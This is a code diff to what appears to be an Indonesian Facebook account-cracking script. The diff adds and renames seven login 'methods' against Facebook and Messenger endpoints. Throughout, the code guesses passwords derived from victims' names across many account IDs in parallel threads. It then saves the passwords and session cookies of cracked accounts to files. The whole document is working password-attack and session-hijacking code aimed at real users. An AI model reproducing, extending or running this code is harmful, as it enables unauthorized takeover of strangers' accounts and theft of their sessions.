@@ -962,10 +962,13 @@ def setting():
 		prints(f'         {P}[red]Input Tidak Diketahui{P}')
 		login_menu()
 	prints(nel(f'                         [bold blue]login Method', style=f"bold purple")) 
-	prints(f'{H2}╰─▶ {B2}01 [bold purple]Method free.facebook.com [green] Validate [white]\n')
-	prints(f'{H2}╰─▶ {B2}02 [bold purple]Method m.facebook.com [green] Async [white]\n')
-	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method graph.facebook.com [green] B-Api [white]\n')
-	prints(f'{H2}╰─▶ {B2}04 [bold purple]Method www.messenger.com [green] Messenger [white]\n')
+	prints(f'{H2}╰─▶ {B2}01 [bold purple]Method m.facebook.com [green] RR07 v1 [white]\n')
+	prints(f'{H2}╰─▶ {B2}02 [bold purple]Method mbasic.facebook.com [green] RR07 v2 [white]\n')
+	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method m.facebook.com [green] RR07 v3 [white]\n')
+	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method free.prod.facebook.com [green] RR07 v4 [white]\n')
+	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method m.facebook.com [green] RR07 v5 [white]\n')
+	prints(f'{H2}╰─▶ {B2}03 [bold purple]Method www.facebook.com [green] RR07 v6 [white]\n')
+	prints(f'{H2}╰─▶ {B2}04 [bold purple]Method www.messenger.com [green] RR07 v7 [white]\n')
 	hc = input(f'✶ ━━⫸ {H} Input{N} : ')
 	if hc in ['1','01']:
 		method.append('metod1')
@@ -975,6 +978,12 @@ def setting():
 		method.append('metod3')
 	elif hc in ['4','04']:
 	    method.append('metod4')
+	elif hc in ['5','05']:
+	    method.append('metod5')
+	elif hc in ['6','06']:
+	    method.append('metod6')
+	elif hc in ['7','07']:
+	    method.append('metod7')
 	else:
 		method.append('metod1')
 	prints(nel(f'                        [bold blue]Manual Password?', style=f"bold purple")) 
@@ -1001,51 +1010,6 @@ def setting():
 		str(tai)
 	passwrd()
 #-------------------[ BAGIAN-WORDLIST ]------------#
-def passwrddd():
-	loading()
-	clear()
-	banner()
-	print(nel(f'                !{H} PROSES CRACK SEDANG BERLANGSUNG{N} !'))
-	print(nel(f'               !{H} ON/OFF MODE PESAWAT SEBELUM MULAI{N} !')) 
-	with tred(max_workers=30) as pool:
-		for yuzong in id2:
-			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			frs = nmf.split(' ')[0]
-			pwv = []
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'321')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'321')
-			if 'ya' in pwpluss:
-				for xpwd in pwnya:
-					pwv.append(xpwd)
-			else:pass
-			if 'metod1' in method:
-				pool.submit(validate1,idf,pwv)
-			elif 'metod2' in method:
-				pool.submit(_async_,uid,pwv)
-			elif 'metod3' in method:
-				pool.submit(_api_,uid,pwv)
-			elif 'metod4' in method:
-				pool.submit(_messenger_,uid,pwv)
-			else:
-				pool.submit(_validate_,uid,pwv)
-				
 	print('')
 	cetak(nel('\t    [cyan][bold green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan][white] '))
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
@@ -1092,6 +1056,14 @@ def passwrd():
 				pool.submit(rr072,idf,pwv)
 			elif 'metod3' in method:
 				pool.submit(rr073,idf,pwv)
+			elif 'metod4' in method:
+				pool.submit(rr074,uid,pwv)
+			elif 'metod5' in method:
+				pool.submit(rr075,uid,pwv)
+			elif 'metod6' in method:
+				pool.submit(rr076,uid,pwv)
+			elif 'metod7' in method:
+				pool.submit(rr077,uid,pwv)
 			else:
 				pool.submit(rr071,idf,pwv)
 	print(f'[•]{H2} OK : {H2}%s '%(ok))
@@ -1102,7 +1074,7 @@ def rr071(idf,pwv):
 	global loop,ok,cp
 	bo = random.choice([m,k,h,b,u,x])
 	ses = requests.Session()
-	sys.stdout.write(f"\r[{bo}RR07 v1{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
+	sys.stdout.write(f"\r[{bo}RR07 v1{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}");clear()
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ses = requests.Session()
@@ -1136,19 +1108,19 @@ def rr071(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp+=1
-				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			elif "c_user" in ses.cookies.get_dict():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} KUKIS : {H2}{kuki}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{H2}{kuki}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
@@ -1179,16 +1151,16 @@ def rr072(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} KUKIS : {H2}{kuki}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{H2}{kuki}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				break
 			elif "checkpoint" in po.cookies.get_dict().keys():
-				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
@@ -1204,7 +1176,6 @@ def rr072(idf,pwv):
 def rr073(idf,pwv):
 	global loop,ok,cp
 	ua = random.choice(ugen)
-	ses = requests.Session()
 	sys.stdout.write(f"\r[{bo}RR07 v3{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
 	sys.stdout.flush()
 	ses = requests.Session()
@@ -1238,19 +1209,19 @@ def rr073(idf,pwv):
 			if "checkpoint" in po.cookies.get_dict().keys():
 				idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
 				cp+=1
-				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 			elif "c_user" in ses.cookies.get_dict().keys():
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				idf = re.findall('c_user=(.*);xs', kuki)[0]
-				print(f"\r{H2}━━⫸{B2} ✶{N} ID : {B2}{uid}|{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} PW : {H2}{pw}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} KUKIS : {H2}{kuki}")
-				print(f"\r{H2}━━⫸{B2} ✶{N} UGENT : {u}{ua}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{idf}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{H2}{kuki}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 			else:
 				continue
@@ -1258,9 +1229,9 @@ def rr073(idf,pwv):
 			time.sleep(31)
 	loop+=1
 ###-----[ METODE VALIDATE ]-----###
-def _validate_(uid,pwv):
+def rr074(uid,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r{P}>>> {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
+	sys.stdout.write(f"\r[{bo}RR07 v4{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
 	sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
@@ -1274,13 +1245,17 @@ def _validate_(uid,pwv):
 			if "c_user" in ses.cookies.get_dict():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f"\r{P}>>> {H}{uid}|{pw} ---> OK{P}")
-				print(f"\r{P}>>> {H}{kuki};{ua}{P}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{H2}{kuki}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
 				break
 			elif "checkpoint" in ses.cookies.get_dict():
 				cp+=1
-				print(f"\r{P}>>> {K}{uid}|{pw} ---> CP{P}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
 				break
 			else:
@@ -1289,9 +1264,9 @@ def _validate_(uid,pwv):
 			time.sleep(15)
 	loop+=1
 ###-----[ METODE ASYNC ]-----###
-def _async_(uid,pwv):
+def rr075(uid,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
+	sys.stdout.write(f"\r[{bo}RR07 v5{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
 	sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
@@ -1307,13 +1282,17 @@ def _async_(uid,pwv):
 			if "c_user" in ses.cookies.get_dict():
 				ok+=1
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
-				print(f"\r{P}  - {H}{kuki};{ua}{P}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{H2}{kuki}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
 				break
 			elif "checkpoint" in ses.cookies.get_dict():
 				cp+=1
-				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
 				break
 			else:
@@ -1322,9 +1301,9 @@ def _async_(uid,pwv):
 			time.sleep(15)
 	loop+=1
 ###-----[ METODE API ]-----###
-def _api_(uid,pwv):
+def rr076(uid,pwv):
 	global loop,ok,cp,a2f
-	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P} A2F-:{M}{a2f}{P}"),
+	sys.stdout.write(f"\r[{bo}RR07 v6{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
 	sys.stdout.flush()
 	ses = requests.Session()
 	for pw in pwv:
@@ -1342,13 +1321,17 @@ def _api_(uid,pwv):
 				for x in coki:
 					cok.update({x["name"]:x["value"]})
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in cok.items() ])
-				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
-				print(f"\r{P}  - {H}{kuki}{P}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{H2}{kuki}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
 				break
 			elif 'www.facebook.com' in response.json()['error_msg']:
 				cp+=1
-				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
 				break
 			elif 'Login approvals' in response.json()['error_msg']:
@@ -1361,9 +1344,9 @@ def _api_(uid,pwv):
 			time.sleep(15)
 	loop+=1
 ###-----[ METODE MESSENGER ]-----###
-def _messenger_(uid,pwv):
+def rr077(uid,pwv):
 	global loop,ok,cp
-	sys.stdout.write(f"\r{P}  - {str(loop)}/{len(uid2)} OK-:{H}{ok}{P} CP-:{K}{cp}{P}"),
+	sys.stdout.write(f"\r[{bo}RR07 v7{x}] [{bo}{loop}{x}/{bo}{len(id)}{x}] {U}OK-{x}:{H}{ok} {U}CP-{x}:{K}{cp}"),
 	sys.stdout.flush()
 	ses = requests.Session()
 	while True:
@@ -1416,13 +1399,17 @@ def _messenger_(uid,pwv):
 			response = ses.post("https://www.messenger.com/login/password/", data=data, headers=headers, allow_redirects=False)
 			if "c_user" in ses.cookies.get_dict():
 				kuki = (';').join(["%s=%s"%(name,value) for name,value in ses.cookies.get_dict().items()]) + headers.get('Cookie').replace(' ','')
-				print(f"\r{P}  - {H}{uid}|{pw} ---> OK{P}")
-				print(f"\r{P}  - {H}{kuki}{P}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{H2}{kuki}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				ok +=1
 				open('Live/'+okc,'a').write(f"{uid}|{pw}|{kuki}\n")
 				break
 			elif "www.facebook.com%2Fcheckpoint" in response.headers.get('Location'):
-				print(f"\r{P}  - {K}{uid}|{pw} ---> CP{P}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} ID : {B2}{uid}|{pw}")
+				print(f"\r{H2}━━⫸{B2} ✶{U} PW : {H2}{pw}")
+				print(f"\r{H2} ╰─▶{U}{ua}")
 				open('Chek/'+cpc,'a').write(f"{uid}|{pw}\n")
 				cp+=1
 				break
